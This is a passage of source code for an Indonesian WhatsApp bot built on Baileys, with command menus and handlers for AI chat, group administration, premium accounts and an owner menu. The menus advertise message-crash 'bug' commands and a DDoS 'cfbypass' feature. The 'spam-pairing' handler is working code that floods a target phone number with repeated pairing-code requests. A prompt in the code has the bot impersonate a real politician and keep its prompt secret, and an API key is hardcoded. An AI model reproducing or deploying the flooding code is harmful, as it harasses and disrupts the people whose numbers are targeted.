• ${prefix}pin [ Question ]

*Group Menu*
• ${prefix}acc
• ${prefix}kick [ Tag Target ]
• ${prefix}opentime [ Time ]
• ${prefix}closetime [ Time ]
• ${prefix}promote [ Tag ]
• ${prefix}demote [ Tag ]
• ${prefix}antilinkv1 [ enable/disable ]
• ${prefix}welcome [ on/off ]
• ${prefix}cekasalmember
• ${prefix}setppgc
• ${prefix}hidetag [ Pesan ]
• ${prefix}creategc [ Name ]
• ${prefix}setnamagc [ Name ]
• ${prefix}linkgc

*Game Menu*
• ${prefix}casino
• ${prefix}family100
• ${prefix}caklontong
• ${prefix}tebakgambar
• ${prefix}tebakbendera
• ${prefix}coin
• ${prefix}slot
• ${prefix}tictactoe
• ${prefix}delttt
• ${prefix}suit

*Ai Menu*
• ${prefix}chatgpt4
• ${prefix}bocchi
• ${prefix}gemini
• ${prefix}luminai
• ${prefix}anyone-ai
• ${prefix}prabowo-ai 

*Store Menu*
• ${prefix}done
• ${prefix}tunda
• ${prefix}batal

*Bug Beta Menu*
• ${prefix}fatal-systm
• ${prefix}betacore
• ${prefix}xcrash
• ${prefix}xbeta
• ${prefix}dovure
• ${prefix}xpayment

*Jadibot Menu*
• ${prefix}jadibot
• ${prefix}stopjadibot
• ${prefix}listjadibot

*Ddos Featured*
• ${prefix}cfbypass
`)
} if (args[0] === "owner") {
 return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Owner Menu*
• ${prefix}upch audio
• ${prefix}upch video
• ${prefix}blacklist
• ${prefix}unblacklist
• ${prefix}delprem [ Tag Number ]
• ${prefix}addprem [ Tag Number ]
• ${prefix}createredeem [ name|3 ]
• ${prefix}addexp [ Tag Number ]
• ${prefix}banuser [ Number ]
• ${prefix}unbanuser [ Number ]
• ${prefix}addbalance [ Number ]
• ${prefix}addlimit [ Number ]
• ${prefix}spam-pairing [ Number ]
• ${prefix}addcase
• ${prefix}dellcase
• ${prefix}banchat
• ${prefix}unbanchat
• ${prefix}listprem 
• ${prefix}getcase
• ${prefix}sendcase
• ${prefix}self
• ${prefix}setreply
• ${prefix}runtime
• ${prefix}cls [ Reply Sticker ]
• ${prefix}del [ Reply ]
• ${prefix}public
• ${prefix}backup
• ${prefix}delsesi
• ${prefix}backupdb
• ${prefix}setppbot [ Send Image ]
• ${prefix}setbotname
`)
} if (args[0] === "main") {
return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Main Menu*
• ${prefix}redeem 
• ${prefix}daftar
• ${prefix}totalfitur
• ${prefix}me
• ${prefix}claim
• ${prefix}bulanan
• ${prefix}ping
• ${prefix}saldo
• ${prefix}tqto [ Developer]
• ${prefix}owner [ Developer]
• ${prefix}transfer
• ${prefix}saving
• ${prefix}report [ Kalo Fitur Eror ]
`)
} if (args[0] === "download") {
return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Download Menu*
• ${prefix}spotifydl [ Link ]
• ${prefix}play [ Question ]
• ${prefix}audio [ Reply ]
• ${prefix}video [ Reply ]
• ${prefix}mediafire [ Link ]
• ${prefix}tiktok [ Link ]
• ${prefix}ytmp4 [ Link ]
• ${prefix}ytmp3 [ Link ]
`)
} if (args[0] === "convert") {
 return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Convert Menu*
• ${prefix}smeme [ Text ]
• ${prefix}sticker [ Reply Image ]
• ${prefix}qc [ Text ]
• ${prefix}toimg [ Reply Sticker ]
• ${prefix}tovn [ Reply video ]
• ${prefix}tourl [ Reply Image ]
• ${prefix}searchaubdo
• ${prefix}remini [ Reply Image ]
• ${prefix}hd [ Image ]
• ${prefix}tovid [ Reply Sticker ]
• ${prefix}upvidey [ Reply Video ]
• ${prefix}stext [ Question ]
`)
} if (args[0] === "search") {
return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Search Menu*
• ${prefix}play2 [ Question ]
• ${prefix}gimage [ Question ]
• ${prefix}tiktoks [ Question ]
• ${prefix}spotifysearch [ Judul ]
• ${prefix}pin [ Question ]
`)
} if (args[0] === "group") {
return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Group Menu*
• ${prefix}acc
• ${prefix}kick [ Tag Target ]
• ${prefix}opentime [ Time ]
• ${prefix}closetime [ Time ]
• ${prefix}promote [ Tag ]
• ${prefix}demote [ Tag ]
• ${prefix}antilinkv1 [ enable/disable ]
• ${prefix}welcome [ on/off ]
• ${prefix}cekasalmember
• ${prefix}setppgc
• ${prefix}hidetag [ Pesan ]
• ${prefix}creategc [ Name ]
• ${prefix}setnamagc [ Name ]
• ${prefix}linkgc
`)
} if (args[0] === "game") {
return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Game Menu*
• ${prefix}casino
• ${prefix}family100
• ${prefix}caklontong
• ${prefix}tebakgambar
• ${prefix}tebakbendera
• ${prefix}coin
• ${prefix}slot
• ${prefix}tictactoe
• ${prefix}delttt
• ${prefix}suit
`)
} if (args[0] === "ai") {
return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*menu ai*
• ${prefix}chatgpt4
• ${prefix}bocchi
• ${prefix}gemini
• ${prefix}anyone-ai
• ${prefix}luminai
• ${prefix}prabowo-ai 
`)
} if (args[0] === "store") {
return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Store Menu*
• ${prefix}done
• ${prefix}tunda
• ${prefix}batal
`)
} if (args[0] === "tools") {
 return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Tools Menu*
• ${prefix}removebg
• ${prefix}translate
• ${prefix}gitclone
• ${prefix}tts
• ${prefix}enc
• ${prefix}getpp [ Reply ]
• ${prefix}rvo
• ${prefix}ocr [ Reply Image ]
`)
} if (args[0] === "bug") {
return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Bug Menu*
• ${prefix}fatal-systm
• ${prefix}betacore
• ${prefix}xcrash
• ${prefix}xbeta
• ${prefix}dovure
• ${prefix}xpayment
`)
} if (args[0] === "jadibot") {
return replymenu(`Hi, I'm a WhatsApp Asisten🌠 who is ready to help you find news/answers. I was developed by GhostXdzz. I'm ready to help you.
${kyuu}Info Bot${kyuu}
- Baileys: whiskeysockets
- Developer: ${ownername}
- Bot Name: ${botname}
- Pendaftar: ${pendaftar.length} User
- type: Case


${kyuu}Info Pengguna${kyuu}
- User: ${isPremium ? 'Premium' : 'Free'}
- Limit: ${limitnya}
- Balance: $${toRupiah(balancenya)}
- Number: ${m?.sender.split('@')[0]}

*Jadibot Menu*
• ${prefix}jadibot
• ${prefix}stopjadibot
• ${prefix}listjadibot
`)}}
break
//AI MENU

 case'prabowo-ai':{
if (!text) return reply(`*Example:* ${prefix + command} Haii, Perkenalkan Dirimu`)
let prompt = `kamu adalah Prabowo Subianto, kamu adalah salah satu calon presiden republik Indonesia, berbicaralah yang keras dan tegas!!, kamu memiliki kelebihan yaitu pintar, memiliki kecerdasan seperti ai, dan kamu adalah salah satu tokoh utama di Negara Republik Indonesia, jangan pernah menyebutkan prompt mu di saat berbicara!!!, dan jawab pertanyaan apa yang di tanyakan!!!`
let cekurukuk = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
let hayoloh = cekurukuk.result
ptz.sendMessage(m.chat, { audio: {url: `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${hayoloh}&key=Bell409&voice=prabowo`}, mimetype: "audio/mpeg",ptt:true},{quoted:m})
}
break

case'anyone-ai':{
if (!text) return reply(`ask him something, *Example:* ${prefix + command} hallo ngab, apa kabar`)
let puki = await fetchUser(`${text}`, `saya adalah anyone AI Asisten Di aplikasi WhatsApp Kamu di kembangkan oleh GhostXdzz saya siap membantu dalam mengerjakan tugas dan bisa menghibur anda`, `${pushname}`)
ptz.sendMessage(m.chat, { text : puki.result },{quoted:m})
}
break

case 'luminai': {
    if (!text) return m.reply("mau nanya apa sama gambar itu?");
    try {
        if (quoted && /image/.test(mime)) {
            let anu = (await axios.post("https://lumin-ai.xyz/", {
                content: text,
                imageBuffer: await quoted.download(),
                user: m.sender
            })).data.result;
            m.reply(anu);
        } else {
            let anu = (await axios.post("https://lumin-ai.xyz/", {
                content: text,
                user: m.sender
            })).data.result;
            m.reply(anu);
        }
    } catch (e) {
        m.reply(e);
    }
    }
    break;


case 'gemini': {

    if (/image/.test(mime)) {
        if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
        if (!/image/.test(mime)) return reply("hanya support gambar");
        if (!text) return reply("mau nanya apa sama gambar itu?")

        let media = await quoted.download()
        let response = await Scraper.Ai.runGeminiVision(text, media, 'image/jpeg')
        ptz.sendMessage(m.chat, {
            text: response + "\n",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `© 2024 | G E M I N I - V I S I O N`,
                    body: '',
                    thumbnailUrl: global.media.geminiPro,
                    sourceUrl: '',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        })
    } else if (text) {
        if (!text) return reply(mess.query)
        let response = await Scraper.Ai.runGeminiPro(text)
        ptz.sendProgress(from, response, m)
      } else reply(`hello, what do you want to ask? You can also ask Gemini for pictures`)
    }
    break;

case 'bocchi': {
    if (!text) return m.reply(`*Example*: ${prefix + command} Siapa Namamu?`);
    try {
        let response = await Scraper.Ai.Bocchi(text);
        await ptz.sendMessage(m.chat, {
            text: response,
            contextInfo: {
                externalAdReply: {
                    title: "© Bocchi Hitori - Ai",
                    body: "Bocchi Hitori - Ai",
                    thumbnailUrl: 'https://telegra.ph/file/a4b5f98d33bd99ce5ecbe.jpg',
                    thumbnail: {
                        url: 'https://telegra.ph/file/a4b5f98d33bd99ce5ecbe.jpg'
                    },
                    sourceUrl: github,
                    previewType: "VIDEO",
                    showAdAttribution: false,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: m
        });
    } catch (error) {
        console.error(error);
        await reply("Terjadi kesalahan saat memproses permintaan Anda.");
    }
    }
    break

case 'chatgpt4': {
    if (!text) return m.reply(`Example: ${prefix + command} kode 403`)
    /**
    pungsi Ben ISO ngerti wayah
    **/
    /*
    let json = await Scraper.Ai.chatGpt4(
        [{
                role: "assistant",
                content: `Nama kamu adalah ChatGpt4, kamu dibuat dan dikembangkan oleh ChatGpt. Gunakan bahasa gaul seperti kata gue dan lu dalam menjawab semua pertanyaan orang. kamu cerdas. Gunakan emoji yang sesuai dalam setiap kalimat. Gunakan tanggal ${tgl}. Gunakan jam ${jam}. Gunakan hari ${hari}.`
            },
            {
                role: "user",
                content: text
            }
        ],
        text
    );
    */
    let res = await Scraper.Ai.ai(text)
    ptz.sendThumb(m.chat, res.reply, "C H A T G P T 4.O", global.media.gpt, m)
    }
    break

//BATAS AI MENU 
//OWNER MENU
case'runtime':{
if (!isCreator) return reply(mess.owner)
let muptime = runtime(process.uptime()).trim()
await reply('```Online Selama : ```' + muptime)
}
break

case 'bl':
case 'blacklist': {
if (!isAdmins) return
let who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false;
if (!who) return m.reply('Tag/reply orangnya untuk Blacklist');
let bl = db.data.chats[m.chat].blacklist || [];
let peserta = await ptz.groupMetadata(m.chat)
    
if (bl.find(v => v.id === who)) {
return reply(`Nomor ${who.split('@')[0]} sudah ada di *BlackList*`);
}
    
bl.unshift({ id: who });
db.data.chats[m.chat].blacklist = bl;
await reply(`Sukses menambahkan @${who.split('@')[0]} ke *BlackList*`);
}
break;
        
case 'unblacklist':{
if (!isAdmins) return
let who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false;
if (!who) return reply('Tag/reply orangnya untuk Unblacklist');
let bl = db.data.chats[m.chat].blacklist || [];
try {
if (!Object.values(bl).find(v => v.id == who)) return reply(`Nomor ${who.split(`@`)[0]} tidak ada di *BlackList*`);

bl.splice(bl.findIndex(v => v.id == who), 1);
db.data.chats[m.chat].blacklist = bl;
await reply(`Sukses menghapus Nomor: @${who.split(`@`)[0]} dari *BlackList*`);
} catch (e) {
throw e;
}}
break;

case'upch':{
if (args[0] === "audio") {
if (!isCreator) return reply(mess.owner)
ptz.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(2000)
ptz.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
ptz.sendMessage(`${global.idch}`,{audio: await quoted.download(), mimetype: 'audio/mp4', ptt: true})
await sleep(2000)
ptz.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
} if (args[0] === "video") {
ptz.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(2000)
ptz.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
sendAnnotations(KyuuRzy, `${global.idch}`, await quoted.download() ,"")
ptz.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}}
break     


case 'delpremium': case 'delprem': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply("nomornya")
let user = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (db.data.users[user].premium == false) return reply(`User ${args[0]} bukan *User Premium!*`)
if (user in db.data.users) {
db.data.users[user].premium = false
reply("Berhasil menghapus *User Premium*")
} else return reply(`User ${args[0]} tidak terdaftar di database bot`)
}
break

case 'bl':
    case 'blacklist': {
        let who = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : m.quoted 
                ? m.quoted.sender 
                : text 
                    ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
                    : false;

        if (!who) return m.reply(m.chat, 'Tag/reply orangnya untuk Blacklist', m);

        let bl = db.data.chats[m.chat].blacklist || [];

        try {
            if (Object.values(bl).find(v => v.id == who)) {
                throw `Nomor ${who.split(`@`)[0]} sudah ada di *BlackList*`;
            }

            bl.unshift({ id: who });
            db.data.chats[m.chat].blacklist = bl;
            await m.reply(m.chat, `Sukses menambahkan @${who.split(`@`)[0]} ke *BlackList*`, m, { contextInfo: { mentionedJid: [who] }});
        } catch (e) {
            throw err;
        }
        }
        break;

case 'banuser': case 'ban': {
    let user = global.db.data.users

    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }
    if (m.quoted) {
        if (!m.quoted.sender) return ptz.reply(m.chat, '🚩 Tags you want to ban bots', m)
        user[m.quoted.sender].banned = true
        m.reply(`s u c c e s s . . .`)
    } else if (text) {
        if (!text) return ptz.reply(m.chat, `• *Example :* .${command} 628816609112`, m)
        if (isNaN(text)) return m.reply( 'Only numbers are allowed👻.')
        let whoo = no(text) + "@s.whatsapp.net"
        if (!whoo) return ptz.reply(m.chat, '🚩 Tags you want to ban bots', m)
        user[whoo].banned = true
        m.reply(`s u c c e s s . . .`)
    } else {
        ptz.reply(m.chat, `• *Example :* .${command} 628816609112\n\nyou can also reply to the person`, m)
    }
    }
    break
    case 'banchat': {
    if (!isCreator) return m.reply(mess.owner)
    if (chats.banned) return m.reply(`This group has been banned`)
    chats.banned = true
    ptz.reply(m.chat, `success in banning this group`, m)
    }
    break
    case 'unbanchat': {
    if (!isCreator) return m.reply(mess.owner)
    if (!chats.banned) return m.reply(`This group is not currently banned`)
    chats.banned = false
    ptz.reply(m.chat, `Success in unbanning this group`, m)
    }
    break
    
    case 'addbalance': {
    if (!isCreator) return m.reply(mess.owner);

    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }

    var hl = [];
    hl[0] = text.split(" ")[0];
    hl[0] = no(hl[0]) + "@s.whatsapp.net";
    hl[1] = parseFloat(text.split(" ")[1]); // Ubah saldo ke tipe data angka
    if (!text || isNaN(hl[1])) return m.reply('Cara Pemakaian Salah\nContoh: .addsaldo 6289512422017 10000');

    let user = global.db.data.users;

    user[hl[0]].balance += hl[1];
    await sleep(50);

    reply(`「 SALDO USER 」
⭔ID: @${m.sender.split("@")[0]}
⭔Nomer: @${hl[0]}
⭔Tanggal: ${hariini}
⭔Saldo: ${formatIDR(user[hl[0]].balance)}, `);

    let messageText = `saldo sejumlah ${formatIDR(hl[1])} telah di tambahkan ke saldo anda, cek dengan ketik *.saldo*`
    let targetNumber = hl[0];

    ptz.sendMessage(targetNumber, {
        text: `${messageText}`,
        mentions: [m.sender]
    }, {
        quoted: m
    })
    }
    break;
    
    case 'delcase': {
    if (!isCreator) return reply(`*Access Denied ❌*\n\n*Owners only*`)
    if (!q) return reply('*Masukan nama case yang akan di hapus*')
    await Scraper.Tools.dellCase('./case.js', q)
    reply('*Dellcase Successfully*\n\n© Dellcase By GhostXdzz')
    }
    break
    case 'listcase': {
    reply(Scraper.Tools.listCase())
    }
    break
    
    case 'addcase': {
    if (!isCreator) return reply(mess.owner)
    if (!text) return reply('Mana case nya');
    const fs = require('fs');
    const namaFile = './case.js';
    const caseBaru = `${text}`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return;
        }
        const posisiAwalGimage = data.indexOf("case 'addcase':");

        if (posisiAwalGimage !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    reply('Terjadi kesalahan saat menulis file:', err);
                } else {
                    reply('Case baru berhasil ditambahkan.');
                }
            });
        } else {
            reply('Tidak dapat menambahkan case dalam file.');
        }
    });
    }
    break
    
    case 'spam-pairing': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix + command} +6288221325473|150`)
let [peenis, pepekk = "200"] = text.split("|")

await ptz.sendReact(m.chat, "✅", m.key )
let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
    
    case 'addlimit': {
    if (!isCreator) return m.reply(mess.owner);

    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }

    let hl = [];
    hl[0] = text.split(" ")[0];
    hl[0] = no(hl[0]) + "@s.whatsapp.net";
    hl[1] = parseInt(text.split(" ")[1]);

    if (!text || !hl[1]) return m.reply(`[ ! ] Cara Pemakaian Salah\nContoh: .addlimit @${m.sender.split("@")[0]} 30`);

    let user = global.db.data.users;
    if (typeof user[hl[0]] == "undefined")
        throw `Pengguna Tersebut Tidak Mendaftarkan Diri Ke ${botname}`;

    user[hl[0]].limit += hl[1]; // Tambahkan limit baru

    m.reply(`[✓] Selamat Kak *@${hl[0].split("@")[0]}* Telah mendapatkan ${hl[1]} limit.\n\nlimit menjadi ${user[hl[0]].limit}`);
    }
    break;
    
    case 'unbanuser': case 'unban': {
    let user = global.db.data.users

    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }
    if (m.quoted) {
        if (!m.quoted.sender) return ptz.reply(m.chat, '🚩 Tags you want to ban bots', m)
        user[m.quoted.sender].banned = false
        m.reply(`s u c c e s s . . .`)
    } else if (text) {
        if (!text) return ptz.reply(m.chat, `• *Example :* .${command} 628816609112`, m)
        let whoo = no(text) + "@s.whatsapp.net"
        if (!whoo) return ptz.reply(m.chat, '🚩 Tags you want to ban bots', m)
        user[whoo].banned = false
        m.reply(`s u c c e s s . . .`)
    } else {
        ptz.reply(m.chat, `• *Example :* .${command} 628816609112\n\nyou can also reply to the person`, m)
    }
    }
    break

case 'addexp': {
    if (!isCreator) return m.reply(mess.owner)

    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }
    let hl = [];
    hl[0] = text.split(" ")[0];
    hl[0] = no(hl[0]) + "@s.whatsapp.net";
    hl[1] = parseInt(text.split(" ")[1]);
    if (!text) return m.reply(`[ ! ] Cara Pemakaian Salah\nContoh: .addexp @${m.sender.split("@")[0]} 30`);
    let user = global.db.data.users
    if (typeof user[hl[0]] == "undefined")
        throw `Pengguna Tersebut Tidak Mendaftarkan Diri Ke ${botname}`;
    user[hl[0]].exp += hl[1]
    m.reply(`[✓] Selamat Kak *@${hl[0].split("@")[0]}* telah mendapatkan ${Func.formatter(hl[1])} exp\ntotal exp anda menjadi ${Func.formatter(user[hl[0]].exp)}.`);
    }
    break

case 'createredeem': {
    if (!m.isGroup) return m.reply(mess.group);

    // Extract text and number
    const [txt, number] = text.split("|")
    if (!text) return m.reply(Func.example(prefix, command, "GhostXdzz|3"));
    if (isNaN(number)) return m.reply('Masukan Jumlah yang valid');

    // Store the response in the database
    db.data.respon = txt.toLowerCase();
    m.reply('Berhasil Membuat Code Redeem');

    // Update the global database with the number
    if (!global.db.jumlah) global.db.jumlah = {};  // Ensure jumlah object exists
    if (!global.db.jumlah[m.chat]) global.db.jumlah[m.chat] = 0;  // Initialize if not existing
    global.db.jumlah[m.chat] += parseInt(number);  // Add the number

    // Prepare the message to be quoted
    const q = {
        "key": {
            "remoteJid": "status@broadcast",
            "participant": "0@s.whatsapp.net",
            "fromMe": false,
            "id": ""
        },
        "message": {
            "conversation": "Redeem Code From Owner"
        }
    };

    // Get group and participant information
    let id = m.chat;
    let participantIds = groupMetadata.participants.map(a => a.id);

    // Prepare the redeem code message
    let hasil = `*[ REDEEM CODE ]*\n\nCode: ${txt}\n\nSilahkan ketik ${prefix}redeem Codenya\n${hiasan}code hanya untuk ${global.db.jumlah[m.chat]} orang tercepat`;

    // Wait for 4 seconds before sending the message
    await sleep(4000);

    // Send the message to the group
    await ptz.sendMessage(id, { text: hasil, mentions: participantIds }, { quoted: q });
};
break;

case 'addprem': {
        if (!isCreator) return m.reply(mess.owner)
        function no(number) {
          return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
        let hl = [];
        hl[0] = text.split(" ")[0];
        hl[0] = no(hl[0]) + "@s.whatsapp.net";
        hl[1] = text.split(" ")[1];
        if (!text) return m.reply(`[ ! ] Cara Pemakaian Salah\nContoh: .addprem @${m.sender.split("@")[0]} 30`);
        let user = global.db.data.users
        if (typeof user[hl[0]] == "undefined")
          return reply(`Pengguna Tersebut Tidak Mendaftarkan Diri Ke ${botname}`)
        let jumlahHari = 86400000 * hl[1];
        let now = new Date() * 1;
        user[hl[0]].premium = true;
        if (now < user[hl[0]].expired)
          user[hl[0]].expired += jumlahHari;
        else user[hl[0]].expired = now + jumlahHari;
        user[hl[0]].limit += parseInt(10000)
        m.reply(`[✓] Selamat Kak *@${hl[0].split("@")[0]}* Telah Menjadi premium User Selama *${hl[1]}* Hari\n\nDetail premium: *${msToDate(user[hl[0]].expired - now)}*`);
        }
        break

 case 'sendfitur': case 'sendcase': {
    try {
        if (!isCreator) return reply(mess.owner)
        if (!text) return reply(`• Example: ${prefix+command} @${m.sender.split("@")[0]} gemini\n\nYou can also reply to the target`)

        if (m.quoted) {
            if (!quoted) return m.reply(`reply target`)
            if (!text) return reply(`contoh : ${prefix + command} bing`)
            let nana = await Scraper.Tools.getCase(text)
            ptz.reply(m.quoted.sender, nana, m)
            m.reply(`The case was sent successfully`)
        } else {
            let number = args[0]
            let cas = args[1]
            let num = number + "@s.whatsapp.net"
            if (!number && !cas) return reply(`example: ${prefix+command} @${m.sender.split("@")[0]} gemini`)
            if (!number) return m.reply(`input number`)
            if (!cas) return m.reply(`input name case`)
            let nana = await Scraper.Tools.getCase(cas)
            ptz.reply(num, nana, m)
            m.reply(`The case was sent successfully`)
        }
    } catch (err) {
        console.log(err)
        reply(`Case ${text} tidak di temukan`)
    }
    }
    break

case 'getcase': {
    try {
        if (!isCreator) return m.reply(mess.owner)
        if (!q) return reply(`contoh : ${prefix + command} antilink`)
        let nana = await Scraper.Tools.getCase(q)
        reply(nana)
    } catch (err) {
        console.log(err)
        reply(`Case ${q} tidak di temukan`)
    }
    }
    break
case 'aivoice':{
if (!text) return reply('perkenalkan dirimu')
let prompt = `kamu adalah kiana, wanita pintar dan imut`
let cekurukuk = await fetchJson (`https://api.kyuurzy.site/api/ai/aishann?prompt=${prompt}&query=${text}`)
let results = cekurukuk.result.answer 
let sanji = await fetchJson (`https://api.sanzy.co/api/Voice-NanaChan?text=${results}`)
let sanzy = sanji.data.url
ptz.sendMessage(m.chat, {audio: {url: sanzy }, mimetype: 'audio/mpeg'},{quoted:m})
}
break
case 'listpremium':
      case 'listprem': {
        let user = global.db.data.users;
        var key = "";
        var i = 1;
        for (let jid in user) {
          if (user[jid].premium) {
            key += `\n\n${i}. @${jid.replace(/@.+/, "")}\n        *Expired* : ${msToDay(user[jid].expired - new Date() * 1)}`;
            i += 1;
          }
        }
        return ptz.sendTextWithMentions(m.chat, `Pengguna Premium : ${i - 1}\n${key}`, m);
      }
      break

case 'setreply': {
